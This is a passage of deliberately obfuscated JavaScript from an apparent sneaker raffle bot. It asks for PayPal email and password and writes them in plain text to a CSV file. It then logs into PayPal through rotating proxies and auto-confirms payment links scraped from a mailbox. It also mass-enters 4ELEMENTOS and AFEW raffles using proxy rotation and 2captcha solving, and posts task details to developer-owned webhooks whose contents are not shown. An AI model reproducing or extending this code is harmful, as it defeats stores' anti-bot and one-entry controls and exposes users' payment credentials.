        let _0xd92109 = {}, _0x34fd8b = await _0xab4dc6['get']('Email');
        _0xd92109['Email'] = _0x34fd8b['Email'];
        var _0x503061 = Math['round'](Math['random']() * (_0x18df90['length'] - 0x1));
        _0xd92109['Proxy'] = _0x18df90[_0x503061], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x2cfc24 = await _0xab4dc6['get']('Password');
        return _0xd92109['Password'] = _0x2cfc24['Password'], _0x65e0bc['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0xd92109['Email'] + ',' + _0xd92109['Password'] + ',' + _0xd92109['Proxy']), _0xd92109;
    }
    let _0x5f12d0 = await _0x1f2d6c();
    var _0x4cf437 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x4d7935 = await _0xab4dc6['get']('Amount'), _0x371b47 = _0x4d7935['Amount'];
    async function _0x4d4b43() {
        let _0x3b1853 = 0x0;
        var _0x4cf171 = new _0x3e4e8d({
            'user': _0x51d52a['masterMail'],
            'password': _0x51d52a['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x477f19(_0x371c86) {
            _0x4cf171['openBox']('INBOX', ![], _0x371c86);
        }
        _0x4cf171['once']('ready', function () {
            _0x477f19(function (_0x45821a, _0x85de0b) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x45821a)
                    throw _0x45821a;
                _0x4cf171['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x312fa7, _0x4e7b33) {
                    if (!_0x4e7b33 || !_0x4e7b33['length'])
                        console['log'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20No\x20mails\x20found'), _0x4cf171['end']();
                    else {
                        _0x4e7b33 = _0x4e7b33['slice'](0x0, _0x371b47);
                        var _0x1c1c93 = _0x4cf171['seq']['fetch'](_0x4e7b33, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x1c1c93['on']('message', function (_0x54ab6e, _0x7b82c6) {
                            var _0x1ac5aa = '(#' + _0x7b82c6 + ')\x20';
                            _0x54ab6e['on']('body', function (_0x284e18, _0x4c8233) {
                                _0x300bc8(_0x284e18, (_0x5a1029, _0x401e98) => {
                                    if (_0x401e98['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x401e98['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x401e98['text']['split']('[')[0x2];
                                        var _0x45b4f3 = mes['split'](']')[0x0];
                                        _0x4cf437['push'](_0x45b4f3);
                                    }
                                });
                            }), _0x54ab6e['once']('end', function () {
                                _0x3b1853++;
                            });
                        }), _0x1c1c93['once']('error', function (_0x5679f8) {
                            console['log']('Fetch\x20error:\x20' + _0x5679f8);
                        }), _0x1c1c93['once']('end', function () {
                            _0x4cf171['end']();
                        });
                    }
                });
            });
        }), _0x4cf171['once']('error', function (_0x7afdec) {
            console['log'](_0x1403a4['red'](_0x7afdec['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x4cf171['once']('end', async function () {
        }), _0x4cf171['connect']();
    }
    try {
        _0x4d4b43(), await _0x116d4a(0xfa0), console['log']('Found\x20' + _0x4cf437['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x116d4a(0xfa0);
    }
    var _0x28f980;
    _0x244762('' + _0x4ddb66);
    var _0x5f4727 = _0x5f12d0['Proxy']['split'](':'), _0x4bbcb3;
    try {
        _0x4bbcb3 = await _0x5d136d['launch']({
            'userDataDir': 'sessions/' + _0x5f12d0['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5f4727[0x0] + ':' + _0x5f4727[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x4bbcb3 = await _0x5d136d['launch']({
            'userDataDir': 'sessions/' + _0x5f12d0['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5f4727[0x0] + ':' + _0x5f4727[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20Getting\x20Session');
        const _0x2aad5e = await _0x4bbcb3['newPage']();
        await _0x2aad5e['authenticate']({
            'username': '' + _0x5f4727[0x2],
            'password': '' + _0x5f4727[0x3]
        }), await _0x2aad5e['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x2aad5e['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x2aad5e['waitForSelector']('#email');
            let _0x59f9ab = await _0x2aad5e['$eval']('#email', _0x599c1b => _0x599c1b['getAttribute']('value'));
            if (_0x59f9ab == '') {
                await _0x2aad5e['type']('#email', _0x5f12d0['Email']), await _0x116d4a(0x1d3);
                let _0x14bfa9 = await _0x2aad5e['$']('#splitPassword');
                _0x14bfa9 && (await _0x2aad5e['click']('#btnNext'), await _0x116d4a(0xa28)), await _0x2aad5e['type']('#password', _0x5f12d0['Password']), await _0x116d4a(0x35c), await _0x2aad5e['click']('#btnLogin');
            } else
                await _0x2aad5e['type']('#password', _0x5f12d0['Password']), await _0x116d4a(0x35c), await _0x2aad5e['click']('#btnLogin');
            await _0x2aad5e['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20Successfully\x20logged\x20in'), await _0x116d4a(0x2710);
        } catch (_0x47f719) {
            throw new Error('Login\x20session\x20expired\x20' + _0x47f719);
        }
        for (var _0x90f064 = 0x0; _0x90f064 < _0x4cf437['length']; _0x90f064++) {
            console['log'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20Task\x20' + (_0x90f064 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x244762(_0x4ddb66 + '\x20Task\x20' + (_0x90f064 + 0x1) + '\x20/\x20' + _0x4cf437['length']);
            const _0x23a526 = await _0x4bbcb3['newPage']();
            await _0x23a526['goto']('' + _0x4cf437[_0x90f064], { 'waitUntil': 'networkidle2' }), await _0x116d4a(0xbb8);
            try {
                const _0x554b16 = await _0x23a526['$']('#challenge-heading');
                _0x554b16 && (console['log'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20Task\x20' + (_0x90f064 + 0x1) + '\x20:\x20' + _0x1403a4['yellow']('2FA\x20Required')), await _0x23a526['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x116d4a(0x9c40), await _0x23a526['waitForSelector']('#payment-submit-btn'), await _0x23a526['$eval']('#payment-submit-btn', _0x1d6559 => _0x1d6559['click']()), await _0x23a526['click']('#payment-submit-btn');
                try {
                    await _0x23a526['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x116d4a(0x5dc), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20Task\x20' + (_0x90f064 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x2b640b) {
                    _0x5a9a4a = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x2b640b['message']);
                } finally {
                    if (_0x5a9a4a == 'yes' && _0x4bbdfc != 0x2) {
                        console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x4ddb66['name'] + ']\x20Task\x20' + (_0x90f064 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4bbdfc + '\x20/\x205)')), _0x90f064 = _0x90f064 - 0x1, _0x4bbdfc = _0x4bbdfc + 0x1;
                        continue;
                    }
                    _0x5a9a4a == 'yes' && _0x4bbdfc >= 0x2 && (_0x5925c7(csv[_0x90f064], _0x4ddb66), _0x5a9a4a = 'no', _0x4bbdfc = 0x0), await _0x23a526['close'](), await _0x116d4a(0x4650);
                }
            } catch (_0x163925) {
                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x4ddb66 + ']\x20Task\x20' + (_0x90f064 + 0x1) + '\x20:\x20' + _0x163925));
            }
        }
    } catch (_0x50cb41) {
        console['log'](_0x1403a4['red']('' + _0x50cb41));
    } finally {
        await _0x4bbcb3['close']();
    }
}
const _0x1a1b7d = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x4f3ce4, _0x4884d0, _0x560d23) {
                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51d52a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4d8bed = 0x0; _0x4d8bed < _0x4884d0['length']; _0x4d8bed++) {
                        if (_0xa276b5 != 'yes')
                            var _0xa276b5 = '', _0x39baf7 = 0x0;
                        var _0x76967c;
                        try {
                            await _0x2c2316(_0x4884d0, _0x4d8bed);
                        } catch {
                            _0xa276b5 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x244762(_0x4f3ce4['name'] + '\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20/\x20' + _0x4884d0['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                        var _0x24088c = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0xd4c1d0 = Math['round'](Math['random']() * (_0x24088c['length'] - 0x1));
                        _0x4884d0[_0x4d8bed]['Size'] == 'RANDOM' && (_0x4884d0[_0x4d8bed]['Size'] = _0x24088c[_0xd4c1d0]);
                        var _0x46e538 = Math['round'](Math['random']() * (_0x560d23['length'] - 0x1)), _0x394c30 = _0x560d23[_0x46e538]['split'](':'), _0x23ffef;
                        try {
                            _0x23ffef = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x394c30[0x0] + ':' + _0x394c30[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x23ffef = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x394c30[0x0] + ':' + _0x394c30[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x212286 = await _0x23ffef['newPage']();
                            await _0x212286['authenticate']({
                                'username': '' + _0x394c30[0x2],
                                'password': '' + _0x394c30[0x3]
                            }), await _0x212286['setRequestInterception'](!![]), _0x212286['on']('request', _0x1c20b4 => {
                                _0x1c20b4['resourceType']() === 'image' || _0x1c20b4['resourceType']() === 'font' || _0x1c20b4['resourceType']() === 'media' ? _0x1c20b4['abort']() : _0x1c20b4['continue']();
                            }), await _0x212286['goto'](_0x4884d0[_0x4d8bed]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x212286['waitForSelector']('#accept-all-gdpr'), await _0x212286['click']('#accept-all-gdpr'), await _0x212286['waitForSelector']('#raffles-product'), await _0x116d4a(0x3e8), await _0x212286['$eval']('#raffles-product', _0x12ebc5 => _0x12ebc5['click']()), await _0x116d4a(0x1388), await _0x212286['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x5aa890 = await _0x212286['$']('.fancybox-inner\x20>\x20iframe'), _0xd02852 = await _0x5aa890['contentFrame']();
                            console['log'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20Checking\x20Information'), await _0xd02852['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x116d4a(0x1f4), await _0xd02852['type']('input[name=\x22sm-form-email\x22]', _0x4884d0[_0x4d8bed]['Email']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-form-name\x22]', _0x4884d0[_0x4d8bed]['FirstName'] + '\x20' + _0x4884d0[_0x4d8bed]['LastName']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-form-street\x22]', _0x4884d0[_0x4d8bed]['Address1'] + '\x20' + _0x4884d0[_0x4d8bed]['HouseNumber'] + '\x20' + _0x4884d0[_0x4d8bed]['Address2']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-form-city\x22]', _0x4884d0[_0x4d8bed]['City']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-form-province\x22]', _0x4884d0[_0x4d8bed]['State']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-form-zip\x22]', _0x4884d0[_0x4d8bed]['Zip']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-form-country\x22]', _0x4884d0[_0x4d8bed]['Country']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-form-phone\x22]', _0x4884d0[_0x4d8bed]['Phone']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x4884d0[_0x4d8bed]['Follower']), await _0x116d4a(0xc8), await _0xd02852['type']('input[name=\x22sm-cst.size\x22]', _0x4884d0[_0x4d8bed]['Size']), await _0x116d4a(0x1f4), await _0xd02852['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x116d4a(0x1f4), await _0xd02852['click']('.icheckbox_simple-custom'), await _0x116d4a(0x1f4), console['log'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20Sending\x20Request'), await _0xd02852['$eval']('form', _0x1b236a => _0x1b236a['submit']()), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0xa276b5 = '';
                            var _0x4e9956 = await _0x2520f4(_0x4884d0[_0x4d8bed], _0x4f3ce4, 'dev', ![]), _0x3a3018 = await _0x2520f4(_0x4884d0[_0x4d8bed], _0x4f3ce4, 'pub', ![]);
                            const _0x405141 = {
                                'succesDEVMSG': { 'embeds': [_0x4e9956] },
                                'succesPUBMSG': { 'embeds': [_0x3a3018] }
                            };
                            try {
                                _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x405141['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x405141['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x405141['succesPUBMSG']);
                            } catch (_0xbd7c0b) {
                                console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xbd7c0b));
                            }
                        } catch (_0x229718) {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20' + _0x229718)), _0x76967c = '' + _0x229718;
                            var _0x184c50 = await _0x2520f4(_0x4884d0[_0x4d8bed], _0x4f3ce4, 'dev', !![], _0x76967c), _0x4e9956 = await _0x2520f4(_0x4884d0[_0x4d8bed], _0x4f3ce4, 'dev', ![]), _0x3a3018 = await _0x2520f4(_0x4884d0[_0x4d8bed], _0x4f3ce4, 'pub', ![]);
                            const _0x4c509c = {
                                'succesDEVMSG': { 'embeds': [_0x4e9956] },
                                'succesPUBMSG': { 'embeds': [_0x3a3018] }
                            };
                            _0x4c509c['errorDEV'] = { 'embeds': [_0x184c50] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x4c509c['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x4c509c['errorDEV']), _0x229718 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0xa276b5 = 'yes');
                        } finally {
                            _0x23ffef['close']();
                            if (_0xa276b5 == 'yes' && _0x39baf7 != 0x5 && _0x76967c != 'Size\x20Not\x20Found') {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Task\x20' + (_0x4d8bed + 0x1) + '\x20:\x20Retrying\x20(' + _0x39baf7 + '\x20/\x205)\x20')), _0x4d8bed = _0x4d8bed - 0x1, _0x39baf7 = _0x39baf7 + 0x1;
                                continue;
                            }
                            _0xa276b5 == 'yes' && _0x39baf7 >= 0x5 && (_0x5925c7(_0x4884d0[_0x4d8bed], _0x4f3ce4), _0xa276b5 = 'no', _0x39baf7 = 0x0), console['log'](_0x3982db() + '\x20[' + _0x4f3ce4['name'] + ']\x20Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x99fd9b, _0x5ad4a7) {
                    var _0x51b3f8 = [];
                    async function _0x21ba67() {
                        var _0x5c1c72 = new _0x3e4e8d({
                            'user': _0x51d52a['masterMail'],
                            'password': _0x51d52a['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4c30f0(_0xa61887) {
                            _0x5c1c72['openBox']('INBOX', ![], _0xa61887);
                        }
                        _0x5c1c72['once']('ready', function () {
                            _0x4c30f0(function (_0x4801b4, _0x3e7a77) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4801b4)
                                    throw _0x4801b4;
                                _0x5c1c72['seq']['search'](['UNSEEN'], function (_0x413402, _0x3b72a6) {
                                    if (!_0x3b72a6 || !_0x3b72a6['length'])
                                        console['log'](_0x3982db() + '\x20[' + _0x99fd9b['name'] + ']\x20No\x20mails\x20found'), _0x5c1c72['end']();
                                    else {
                                        var _0x972bb7 = _0x5c1c72['seq']['fetch'](_0x3b72a6, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x972bb7['on']('message', function (_0x1a3dfb, _0x3936c9) {
                                            var _0x16dd07 = '(#' + _0x3936c9 + ')\x20';
                                            _0x1a3dfb['on']('body', function (_0x1ae1f1, _0x118b42) {
                                                _0x300bc8(_0x1ae1f1, (_0x3ae10c, _0x3e2ca9) => {
                                                    if (_0x3e2ca9['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x23a6d1 = _0x3e2ca9['html']['split']('\x0a');
                                                        for (var _0xd3d4e1 = 0x0; _0xd3d4e1 < _0x23a6d1['length']; _0xd3d4e1++) {
                                                            if (_0x23a6d1[_0xd3d4e1]['includes']('salesmanago') && _0x23a6d1[_0xd3d4e1]['includes']('<td') && _0x23a6d1[_0xd3d4e1]['includes']('href')) {
                                                                var _0x15c25d = _0x23a6d1[_0xd3d4e1]['split']('href=\x22'), _0x2592ef = _0x15c25d[0x1]['split']('\x22')[0x0];
                                                                _0x51b3f8['push'](_0x2592ef);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x1a3dfb['once']('end', function () {
                                            });
                                        }), _0x972bb7['once']('error', function (_0x2ffcf4) {
                                            console['log']('Fetch\x20error:\x20' + _0x2ffcf4);
                                        }), _0x972bb7['once']('end', function () {
                                            _0x5c1c72['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x5c1c72['once']('error', function (_0x194fd8) {
                            console['log'](_0x1403a4['red'](_0x194fd8['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x5c1c72['once']('end', async function () {
                        }), _0x5c1c72['connect']();
                    }
                    async function _0x4f6b58(_0x4df3c0, _0x2b3864, _0xb3bdbd) {
                        for (var _0x3feed2 = 0x0; _0x3feed2 < _0x2b3864['length']; _0x3feed2++) {
                            async function _0x366a95(_0x4b54da, _0x49e241, _0xc60e72, _0x426826, _0x36eb60) {
                                var _0x3bd64e, _0x5c6f44 = {}, _0x5f480b = [], _0x4ed3b7 = {}, _0x149574 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x63e1b9 = Math['round'](Math['random']() * (_0x149574['length'] - 0x1));
                                _0x426826[_0x4b54da]['Size'] == 'RANDOM' && (_0x426826[_0x4b54da]['Size'] = _0x149574[_0x63e1b9]);
                                !_0x426826 && (_0x426826 = {});
                                if (_0x51d52a['useRandomProxy'] = ![])
                                    var _0x5c78a4 = _0x36eb60[_0x4b54da]['split'](':');
                                else
                                    var _0xd345b7 = Math['round'](Math['random']() * (_0x36eb60['length'] - 0x1)), _0x5c78a4 = _0x36eb60[_0xd345b7]['split'](':');
                                var _0x147a17 = {
                                    'jar': _0x103baf,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xc60e72['url'],
                                    'headers': _0xc60e72['headers'],
                                    'body': JSON['stringify'](_0x5c6f44),
                                    'proxy': 'http://' + _0x5c78a4[0x2] + ':' + _0x5c78a4[0x3] + '@' + _0x5c78a4[0x0] + ':' + _0x5c78a4[0x1]
                                };
                                return _0x49e241 != 'ver' && (_0x147a17['url'] = _0xc60e72['url'], _0x147a17['headers'] = _0xc60e72['headers']), _0x49e241 == 'ver' && (_0x147a17['method'] = 'GET', _0x147a17['url'] = _0x426826[_0x4b54da]), new Promise(function (_0x116be0, _0x3a481f) {
                                    callback = async (_0x3bc063, _0x3a8ef6, _0x5eb668) => {
                                        if (!_0x3bc063 && _0x3a8ef6['statusCode'] == 0xca || !_0x3bc063 && _0x3a8ef6['statusCode'] == 0xc8) {
                                            if (_0x49e241 != 'ver') {
                                                var _0x7cb4b9 = await _0x2520f4(_0x426826[_0x4b54da], _0xc60e72, 'dev', ![]), _0x1aadfb = await _0x2520f4(_0x426826[_0x4b54da], _0xc60e72, 'pub', ![]);
                                                const _0x3b34d7 = {
                                                    'succesDEVMSG': { 'embeds': [_0x7cb4b9] },
                                                    'succesPUBMSG': { 'embeds': [_0x1aadfb] }
                                                };
                                                if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
                                                    try {
                                                        await _0x3c7bbe(_0x51d52a['webhook'], _0x3b34d7['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x3b34d7['succesDEVMSG']), await _0x116d4a(0xc8);
                                                try {
                                                    await _0x3c7bbe(_0x55a106, _0x3b34d7['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x523ce4(_0x426826[_0x4b54da], _0xc60e72);
                                            }
                                            _0x116be0(console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0xc60e72['name'] + ']\x20Task\x20' + (_0x4b54da + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x49e241 != 'ver') {
                                                var _0x3587d2 = '' + _0x3bc063, _0x1222ed = await _0x2520f4(_0x426826[_0x4b54da], _0xc60e72, 'dev', !![], _0x3587d2), _0x4f92b0 = {};
                                                _0x4f92b0['errorDEV'] = { 'embeds': [_0x1222ed] }, _0x5925c7(_0x426826[_0x4b54da], _0xc60e72), _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x4f92b0['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x4f92b0['errorDEV']);
                                            }
                                            _0x3a481f(console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xc60e72['name'] + ']\x20Task\x20' + (_0x4b54da + 0x1) + ':\x20' + _0x3bc063)));
                                        }
                                    };
                                    try {
                                        _0x49e241 != 'ver' ? console['log'](_0x3982db() + '\x20[' + _0xc60e72['name'] + ']\x20Task\x20' + (_0x4b54da + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5c6f44['data']['attributes']['email']) : console['log'](_0x3982db() + '\x20[' + _0xc60e72['name'] + ']\x20Task\x20' + (_0x4b54da + 0x1) + ':\x20Fetching\x20Response'), _0x225fcc(_0x147a17, callback);
                                    } catch (_0x2a0be8) {
                                        console['log'](_0x3982db() + '\x20Task\x20' + (_0x4b54da + 0x1) + ':\x20' + _0x2a0be8);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x366a95(_0x3feed2, 'ver', _0x4df3c0, _0x2b3864, _0xb3bdbd), console['log'](_0x3982db() + '\x20[' + _0x4df3c0['name'] + ']\x20Sleeping\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                            } catch (_0x7b5ae2) {
                            }
                        }
                    }
                    try {
                        _0x21ba67(), await _0x116d4a(0xfa0), console['log']('Found\x20' + _0x51b3f8['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x4f6b58(_0x99fd9b, _0x51b3f8, _0x5ad4a7);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0xb02146, _0x585d00, _0x3263cc) {
                for (var _0x486823 = 0x0; _0x486823 < _0x585d00['length']; _0x486823++) {
                    _0x51d52a['AfewDelay'] = _0x51d52a['delay'];
                    var _0x153d5e;
                    if (_0x1c9b59 != 'yes')
                        var _0x1c9b59 = '', _0x4870ec = 0x0;
                    var _0x351550 = _0x585d00[_0x486823]['Url'], _0x46d92e = _0x585d00[_0x486823];
                    _0x244762(_0xb02146['name'] + '\x20Task\x20' + (_0x486823 + 0x1) + '\x20/\x20' + _0x585d00['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                    try {
                        await _0x2c2316(_0x585d00, _0x486823);
                    } catch {
                        _0x1c9b59 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x24a07c(_0x4d729e) {
                        const _0x534c14 = _0x65e0bc['readFileSync']('../successful-tasks.csv', 'utf8'), _0x255a97 = _0x3e0e2d['parse'](_0x534c14, { 'header': !![] })['data'];
                        let _0x2645d5 = ![];
                        for (var _0x365417 of _0x255a97) {
                            if (_0x365417['Url'] == _0x4d729e['Url'] && _0x365417['Email'] == _0x4d729e['Email']) {
                                _0x2645d5 = !![];
                                break;
                            }
                        }
                        return _0x2645d5;
                    }
                    if (await _0x24a07c(_0x585d00[_0x486823]) == !![]) {
                        console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x17a2bf = await _0x2520f4(_0x585d00[_0x486823], _0xb02146, 'dev', ![]), _0x5854d3 = await _0x2520f4(_0x585d00[_0x486823], _0xb02146, 'pub', ![]);
                    const _0x241d3d = {
                        'succesDEVMSG': { 'embeds': [_0x17a2bf] },
                        'succesPUBMSG': { 'embeds': [_0x5854d3] }
                    };
                    if (_0x585d00[_0x486823]['Email'] == '' || _0x585d00[_0x486823]['FirstName'] == '' || _0x585d00[_0x486823]['LastName'] == '' || _0x585d00[_0x486823]['Country'] == '' || _0x585d00[_0x486823]['Size'] == '' || _0x585d00[_0x486823]['Address1'] == '' || _0x585d00[_0x486823]['Zip'] == '') {
                        console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x51d52a['useRandomProxy'] = ![])
                        var _0x2fccad = _0x3263cc[_0x486823]['split'](':');
                    else
                        var _0x3746d2 = Math['round'](Math['random']() * (_0x3263cc['length'] - 0x1)), _0x2fccad = _0x3263cc[_0x3746d2]['split'](':');
                    var _0x213ce9;
                    try {
                        _0x213ce9 = await _0x5d136d['launch']({
